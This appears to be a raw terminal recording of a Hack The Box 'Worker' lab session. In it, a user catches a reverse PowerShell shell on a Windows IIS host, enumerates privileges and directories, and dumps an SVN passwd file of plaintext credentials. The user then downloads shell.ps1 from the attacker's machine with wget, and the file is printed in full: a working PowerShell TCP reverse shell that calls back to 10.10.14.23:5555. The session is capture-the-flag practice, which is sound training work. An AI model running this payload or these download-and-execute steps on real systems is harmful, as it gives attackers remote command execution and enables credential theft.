@@ -1,0 +1,310 @@
+Script started on 2021-04-05 19:08:27-07:00 [TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="138" LINES="31"]
+[?2004h[0;31m┌─[[0;39muser[01;33m@[01;96mparrot-virtual[0;31m]─[[0;32m~/htb/worker[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mrl
+rletopnm  rlinetd   rlogin    rlwrap    
+[0;31m┌─[[0;39muser[01;33m@[01;96mparrot-virtual[0;31m]─[[0;32m~/htb/worker[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mrl
+rletopnm  rlinetd   rlogin    rlwrap    
+[0;31m┌─[[0;39muser[01;33m@[01;96mparrot-virtual[0;31m]─[[0;32m~/htb/worker[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mrlwrap nc -lnvp 4444
+[?2004llistening on [any] 4444 ...
+[Kconnect to [10.10.14.23] from (UNKNOWN) [10.10.10.203] 51018
+[K[K[?2004hls[K[Kpwd[?2004l[Kpwd
+[K
+Path                       
+----                       
+C:\windows\system32\inetsrv
+
+
+PS C:\windows\system32\inetsrv> [KPS C:\windows\system32\inetsrv> [K[?2004hPS C:\windows\system32\inetsrv> whoami[?2004l[Kwhoami
+[Kiis apppool\defaultapppool
+PS C:\windows\system32\inetsrv> [KPS C:\windows\system32\inetsrv> [K[?2004hPS C:\windows\system32\inetsrv> [H[2JPS C:\windows\system32\inetsrv> net lco[K[Kocalgroup adminis[K[K[Knistratora[Ks[?2004l[Knet localgroup administrators
+[KAlias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+The command completed successfully.
+
+PS C:\windows\system32\inetsrv> [KPS C:\windows\system32\inetsrv> [K[?2004hPS C:\windows\system32\inetsrv> w:[?2004l[Kw:
+[KPS W:\> [KPS W:\> [K[?2004hPS W:\> dir[?2004l[Kdir
+[K
+
+    Directory: W:\
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----       2020-06-16     18:59                agents                                                                
+d-----       2020-03-28     14:57                AzureDevOpsData                                                       
+d-----       2020-04-03     11:31                sites                                                                 
+d-----       2020-06-20     16:04                svnrepos                                                              
+
+
+PS W:\> [KPS W:\> [K[?2004hPS W:\>  [K [Kdir[?2004l[Kdir
+[K
+
+    Directory: W:\
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----       2020-06-16     18:59                agents                                                                
+d-----       2020-03-28     14:57                AzureDevOpsData                                                       
+d-----       2020-04-03     11:31                sites                                                                 
+d-----       2020-06-20     16:04                svnrepos                                                              
+
+
+PS W:\> [KPS W:\> [K[?2004hPS W:\> cd svnrepos[C[C[C[C[C[C[C[C[?2004l[Kcd svnrepos
+[KPS W:\svnrepos> [KPS W:\svnrepos> [K[?2004hPS W:\svnrepos> ls[?2004l[Kls
+[K
+
+    Directory: W:\svnrepos
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----       2020-06-20     11:29                www                                                                   
+
+
+PS W:\svnrepos> [KPS W:\svnrepos> [K[?2004hPS W:\svnrepos> cd www[?2004l[Kcd www
+[KPS W:\svnrepos\www> [KPS W:\svnrepos\www> [K[?2004hPS W:\svnrepos\www> ls[?2004l[Kls
+[K
+
+    Directory: W:\svnrepos\www
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----       2020-06-20     15:30                conf                                                                  
+d-----       2020-06-20     15:52                db                                                                    
+d-----       2020-06-20     11:29                hooks                                                                 
+d-----       2020-06-20     11:29                locks                                                                 
+-ar---       2020-06-20     11:29              2 format                                                                
+-a----       2020-06-20     11:29            251 README.txt                                                            
+
+
+PS W:\svnrepos\www> [KPS W:\svnrepos\www> [K[?2004hPS W:\svnrepos\www> cd conf[?2004l[Kcd conf
+[KPS W:\svnrepos\www\conf> [KPS W:\svnrepos\www\conf> [K[?2004hPS W:\svnrepos\www\conf> ls[?2004l[Kls
+[K
+
+    Directory: W:\svnrepos\www\conf
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----       2020-06-20     11:29           1112 authz                                                                 
+-a----       2020-06-20     11:29            904 hooks-env.tmpl                                                        
+-a----       2020-06-20     15:27           1031 passwd                                                                
+-a----       2020-04-04     20:51           4454 svnserve.conf                                                         
+
+
+PS W:\svnrepos\www\conf> [KPS W:\svnrepos\www\conf> [K[?2004hPS W:\svnrepos\www\conf> ca[K[Kcat passwd[?2004l[Kcat passwd
+[K### This file is an example password file for svnserve.
+### Its format is similar to that of svnserve.conf. As shown in the
+### example below it contains one section labelled [users].
+### The name and password for each user follow, one account per line.
+
+[users]
+nathen = wendel98
+nichin = fqerfqerf
+nichin = asifhiefh
+noahip = player
+nuahip = wkjdnw
+oakhol = bxwdjhcue
+owehol = supersecret
+paihol = painfulcode
+parhol = gitcommit
+pathop = iliketomoveit
+pauhor = nowayjose
+payhos = icanjive
+perhou = elvisisalive
+peyhou = ineedvacation
+phihou = pokemon
+quehub = pickme
+quihud = kindasecure
+rachul = guesswho
+raehun = idontknow
+ramhun = thisis
+ranhut = getting
+rebhyd = rediculous
+reeinc = iagree
+reeing = tosomepoint
+reiing = isthisenough
+renipr = dummy
+rhiire = users
+riairv = canyou
+ricisa = seewhich
+robish = onesare
+robisl = wolves11
+robive = andwhich
+ronkay = onesare
+rubkei = the
+rupkel = sheeps
+ryakel = imtired
+sabken = drjones
+samken = aqua
+sapket = hamburger
+sarkil = friday
+PS W:\svnrepos\www\conf> [KPS W:\svnrepos\www\conf> [K[?2004hPS W:\svnrepos\www\conf> whoam [Ki .al[K[K[K.all[K[K[K[K/all[?2004l[Kwhoami /all
+[K
+USER INFORMATION
+----------------
+
+User Name                  SID                                                          
+========================== =============================================================
+iis apppool\defaultapppool S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                           Type             SID          Attributes                                        
+==================================== ================ ============ ==================================================
+Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
+Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
+LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+                                     Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+PS W:\svnrepos\www\conf> [KPS W:\svnrepos\www\conf> [K[?2004hPS W:\svnrepos\www\conf> cd c:\windows[?2004l[Kcd c:\windows
+[KPS C:\windows> [KPS C:\windows> [K[?2004hPS C:\windows> cd temp[?2004l[Kcd temp
+[KPS C:\windows\temp> [KPS C:\windows\temp> [K[?2004hPS C:\windows\temp> ls[?2004l[Kls
+[K
+
+    Directory: C:\windows\temp
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----       2020-08-21     14:31                9D315CFD-5B09-4F10-8C8D-586EA71F5593-Sigs                             
+d-----       2020-04-02     20:00                Microsoft                                                             
+d-----       2020-07-24     12:04                vmware-SYSTEM                                                         
+d-----       2020-08-18     00:33                {444A407E-18A4-479F-B5A9-8F566EF6CC07}                                
+d-----       2020-03-28     14:53                {A460F04A-E594-45C2-9676-D5CB54BB976F}                                
+-a----       2021-04-06     04:26         285610 MpCmdRun.log                                                          
+-a----       2020-08-21     14:31         347540 MpSigStub.log                                                         
+-a----       2021-04-06     00:55             98 silconfig.log                                                         
+-a----       2020-08-21     14:54          62441 vmware-vmsvc.log                                                      
+-a----       2020-08-21     14:41          16191 vmware-vmusr.log                                                      
+-a----       2021-04-06     00:54            960 vmware-vmvss.log                                                      
+
+
+PS C:\windows\temp> [KPS C:\windows\temp> [K[?2004hPS C:\windows\temp> wget [K[K[K[K[Kwget [K[K[K[K[Kwget http://10.10.10.[K[K4.23/shell.psq [K[K1 [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[Kwget http://10.10.14.23/shell.ps1 
+[KPS C:\windows\temp> [KPS C:\windows\temp> [K[?2004hPS C:\windows\temp> ls[?2004l[Kls
+[K
+
+    Directory: C:\windows\temp
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----       2020-08-21     14:31                9D315CFD-5B09-4F10-8C8D-586EA71F5593-Sigs                             
+d-----       2020-04-02     20:00                Microsoft                                                             
+d-----       2020-07-24     12:04                vmware-SYSTEM                                                         
+d-----       2020-08-18     00:33                {444A407E-18A4-479F-B5A9-8F566EF6CC07}                                
+d-----       2020-03-28     14:53                {A460F04A-E594-45C2-9676-D5CB54BB976F}                                
+-a----       2021-04-06     04:26         285610 MpCmdRun.log                                                          
+-a----       2020-08-21     14:31         347540 MpSigStub.log                                                         
+-a----       2021-04-06     00:55             98 silconfig.log                                                         
+-a----       2020-08-21     14:54          62441 vmware-vmsvc.log                                                      
+-a----       2020-08-21     14:41          16191 vmware-vmusr.log                                                      
+-a----       2021-04-06     00:54            960 vmware-vmvss.log                                                      
+
+
+PS C:\windows\temp> [KPS C:\windows\temp> [K[?2004hPS C:\windows\temp> ls[?2004l[Kls
+[K
+
+    Directory: C:\windows\temp
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----       2020-08-21     14:31                9D315CFD-5B09-4F10-8C8D-586EA71F5593-Sigs                             
+d-----       2020-04-02     20:00                Microsoft                                                             
+d-----       2020-07-24     12:04                vmware-SYSTEM                                                         
+d-----       2020-08-18     00:33                {444A407E-18A4-479F-B5A9-8F566EF6CC07}                                
+d-----       2020-03-28     14:53                {A460F04A-E594-45C2-9676-D5CB54BB976F}                                
+-a----       2021-04-06     04:26         285610 MpCmdRun.log                                                          
+-a----       2020-08-21     14:31         347540 MpSigStub.log                                                         
+-a----       2021-04-06     00:55             98 silconfig.log                                                         
+-a----       2020-08-21     14:54          62441 vmware-vmsvc.log                                                      
+-a----       2020-08-21     14:41          16191 vmware-vmusr.log                                                      
+-a----       2021-04-06     00:54            960 vmware-vmvss.log                                                      
+
+
+PS C:\windows\temp> [KPS C:\windows\temp> [K[?2004hPS C:\windows\temp> lswget http://10.10.14.23/shell.ps1 -o shell.sp[K[Kps1[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[Kwget http://10.10.14.23/shell.ps1 -o shell.ps1
+[KPS C:\windows\temp> [KPS C:\windows\temp> [K[?2004hPS C:\windows\temp> ls[?2004l[Kls
+[K
+
+    Directory: C:\windows\temp
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----       2020-08-21     14:31                9D315CFD-5B09-4F10-8C8D-586EA71F5593-Sigs                             
+d-----       2020-04-02     20:00                Microsoft                                                             
+d-----       2020-07-24     12:04                vmware-SYSTEM                                                         
+d-----       2020-08-18     00:33                {444A407E-18A4-479F-B5A9-8F566EF6CC07}                                
+d-----       2020-03-28     14:53                {A460F04A-E594-45C2-9676-D5CB54BB976F}                                
+-a----       2021-04-06     04:26         285610 MpCmdRun.log                                                          
+-a----       2020-08-21     14:31         347540 MpSigStub.log                                                         
+-a----       2021-04-06     05:12            502 shell.ps1                                                             
+-a----       2021-04-06     00:55             98 silconfig.log                                                         
+-a----       2020-08-21     14:54          62441 vmware-vmsvc.log                                                      
+-a----       2020-08-21     14:41          16191 vmware-vmusr.log                                                      
+-a----       2021-04-06     00:54            960 vmware-vmvss.log                                                      
+
+
+PS C:\windows\temp> [KPS C:\windows\temp> [K[?2004hPS C:\windows\temp> cat sh[Khell [K.ps1[?2004l[Kcat shell.ps1
+[K$client = New-Object System.Net.Sockets.TCPClient("10.10.14.23",5555);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+PS C:\windows\temp> [KPS C:\windows\temp> [K[?2004hPS C:\windows\temp> ls[?2004l[Kls
+[K
+
+    Directory: C:\windows\temp
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----       2020-08-21     14:31                9D315CFD-5B09-4F10-8C8D-586EA71F5593-Sigs                             
+d-----       2020-04-02     20:00                Microsoft                                                             
+d-----       2020-07-24     12:04                vmware-SYSTEM                                                         
+d-----       2020-08-18     00:33                {444A407E-18A4-479F-B5A9-8F566EF6CC07}                                
+d-----       2020-03-28     14:53                {A460F04A-E594-45C2-9676-D5CB54BB976F}                                
+-a----       2021-04-06     04:26         285610 MpCmdRun.log                                                          
+-a----       2020-08-21     14:31         347540 MpSigStub.log                                                         
+-a----       2021-04-06     05:12            502 shell.ps1                                                             
+-a----       2021-04-06     00:55             98 silconfig.log                                                         
+-a----       2020-08-21     14:54          62441 vmware-vmsvc.log                                                      
+-a----       2020-08-21     14:41          16191 vmware-vmusr.log                                                      
+-a----       2021-04-06     00:54            960 vmware-vmvss.log                                                      
+
+
+PS C:\windows\temp> [KPS C:\windows\temp> [K[?2004hPS C:\windows\temp> [?2004l
+[K
+[?2004h[0;31m┌─[[0;31m✗[0;37m]─[[0;39muser[01;33m@[01;96mparrot-virtual[0;31m]─[[0;32m~/htb/worker[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mrlwrap nc -lnvp 4444[C[C[C[C[C[C[Kexit
+[?2004lexit
+
+Script done on 2021-04-05 21:27:47-07:00 [COMMAND_EXIT_CODE="1"]
